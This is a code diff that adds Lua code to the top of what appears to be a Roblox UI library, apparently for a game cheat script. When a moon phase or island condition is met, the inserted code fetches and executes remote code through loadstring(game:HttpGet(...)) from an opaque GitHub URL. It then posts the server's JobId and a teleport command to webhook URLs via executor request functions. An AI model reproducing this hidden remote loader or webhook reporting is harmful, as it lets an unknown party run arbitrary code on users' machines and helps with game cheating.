@@ -1,3 +1,119 @@
+local Players = game:GetService("Players")
+    local playerCount = #game:GetService("Players"):GetPlayers()
+local FullMoon = ""
+
+spawn(function()
+    while task.wait() do
+        pcall(function()
+             if game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149431" then
+                        FullMoon = "🌑 : Full Moon 100%"
+                    elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149052" then
+                        FullMoon ="🌒 : Full Moon 75%"
+                    elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709143733" then
+                        FullMoon="🌓 : Full Moon 50%"
+                    elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709150401" then
+                        FullMoon="🌗 : Full Moon 25%"
+                    elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149680" then
+                        FullMoon="🌖 : Full Moon 15%"
+                    else
+                        FullMoon="🌚 : Full Moon 0%"
+                    end
+                end)
+            end
+end)
+
+if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/sadsadsafdfasf/b/main/wedhook'))()
+
+                    local HttpService = game:GetService("HttpService")
+                    local Data =
+                        {
+                            ["embeds"]= {
+                                {            
+                                    ["title"]= "Đảo Bí Ẩn";
+                                    ["color"]= tonumber(0x7269da);
+                                    
+                                    ["fields"]= {
+                                        {
+                                            ["name"]= "Check Trăng",
+                                            ["value"]= FullMoon,
+                                            ["inline"]= true
+                                        },
+                                        {
+                                            ["name"]= "Người Trong Sever",
+                                            ["value"]= "```"..playerCount.."/12```",
+                                            ["inline"]= true
+                                        },
+                                        {
+                                            ["name"]= "",
+                                            ["value"]= '',
+                                            ["inline"]= true
+                                        },
+                                    {
+                                            ["name"]= "lệnh teleport sever",
+                                            ["value"]= 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)',
+                                            ["inline"]= true
+                                        },
+                                    }              
+                                }
+                            }
+                    }
+                    local Headers = {["Content-Type"]="application/json"}
+                    local Encoded = HttpService:JSONEncode(Data)
+                    
+                    Request = http_request or request or HttpPost or syn.request
+                    local Final1 = {Url = _G.daobian , Body = Encoded, Method = "POST", Headers = Headers}
+                   
+                    Request(Final1)
+                    end
+
+
+
+if World3 then
+if game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149431" then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/sadsadsafdfasf/b/main/wedhook'))()
+
+                    local HttpService = game:GetService("HttpService")
+                    local Data =
+                        {
+                            ["embeds"]= {
+                                {            
+                                    ["title"]= "Full Moon";
+                                    ["color"]= tonumber(0x7269da);
+                                    
+                                    ["fields"]= {
+                                        {
+                                            ["name"]= "Check Trăng",
+                                            ["value"]= FullMoon,
+                                            ["inline"]= true
+                                        },
+                                        {
+                                            ["name"]= "Người Trong Sever",
+                                            ["value"]= "```"..playerCount.."/12```",
+                                            ["inline"]= true
+                                        },
+                                    {
+                                            ["name"]= "lệnh teleport sever",
+                                            ["value"]= 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)',
+                                            ["inline"]= true
+                                        },
+                                    }              
+                                }
+                            }
+                    }
+                    local Headers = {["Content-Type"]="application/json"}
+                    local Encoded = HttpService:JSONEncode(Data)
+                    
+                    Request = http_request or request or HttpPost or syn.request
+                    local Final1 = {Url = _G.FullMoon , Body = Encoded, Method = "POST", Headers = Headers}
+                   
+                    Request(Final1)
+end
+                end
+
+
+
+
 local DiscordLib = {}
 	local TweenService = game:GetService("TweenService")
 	local Balaraja = Instance.new("ScreenGui")
